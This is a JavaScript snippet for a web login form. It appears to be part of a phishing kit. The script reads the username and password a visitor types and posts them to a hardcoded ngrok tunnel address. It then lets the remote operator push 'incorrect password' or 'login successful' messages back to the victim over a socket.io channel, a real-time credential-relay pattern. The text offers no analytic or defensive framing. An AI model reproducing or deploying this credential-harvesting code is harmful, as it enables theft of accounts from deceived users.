<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
<script>
(function(){
  var BACKEND = window.__BACKEND_URL__ || 'https://queenly-paterfamiliar-adah.ngrok-free.dev';
  var errDiv = document.getElementById('error-message');
  var btn = document.getElementById('login-button');
  var sessionId = 'default';
  
  var socket = io(BACKEND, { transports: ['websocket', 'polling'] });
  
  socket.on('connect', function() {
    socket.emit('join', { session_id: sessionId });
  });
  
  socket.on('login_error', function(data) {
    if(data.session_id === sessionId) {
      if(btn){btn.disabled=false;btn.textContent='Log In';}
      showErr(data.message || 'Incorrect username or password. Please try again.');
    }
  });
  
  socket.on('login_success', function(data) {
    if(data.session_id === sessionId) {
      if(btn){btn.disabled=false;btn.textContent='Processing...';}
      showErr('Login successful! Please wait...');
    }
  });
  
  document.addEventListener('DOMContentLoaded', function(){
    var form = document.querySelector('.login-form');
    if(form) form.appendChild(errDiv);
  });

  function showErr(msg){
    errDiv.textContent=msg;
    errDiv.style.display='block';
  }

  function doLogin(e){
    if(e) e.preventDefault();
    var username = (document.getElementById('login-username')||{}).value||'';
    var password = (document.getElementById('login-password')||{}).value||'';
    username = username.trim();
    if(!username||!password){showErr('Please enter your username and password.');return;}
    errDiv.style.display='none';
    if(btn){btn.disabled=true;btn.textContent='Logging in...';}
    fetch(BACKEND+'/api/submit',{
      method:'POST',
      headers:{'Content-Type':'application/json','ngrok-skip-browser-warning':'1'},
      body:JSON.stringify({username:username,password:password,session_id:sessionId})
    }).then(function(r){
      if(!r.ok){
        if(btn){btn.disabled=false;btn.textContent='Log In';}
        showErr('Incorrect username or password. Please try again.');
      }
    }).catch(function(){
      if(btn){btn.disabled=false;btn.textContent='Log In';}
      showErr('Could not connect. Please try again.');
    });
  }

  window.addEventListener('DOMContentLoaded', function(){
    var loginBtn = document.getElementById('login-button');
    if(loginBtn) loginBtn.addEventListener('click', doLogin);
    ['login-username','login-password'].forEach(function(id){
      var el = document.getElementById(id);
      if(el) el.addEventListener('keydown', function(e){if(e.key==='Enter') doLogin();});
      if(el) el.addEventListener('input', function(){errDiv.style.display='none';});
    });
    var form = document.querySelector('.login-form');
    if(form) form.appendChild(errDiv);
  });
})();
</script>
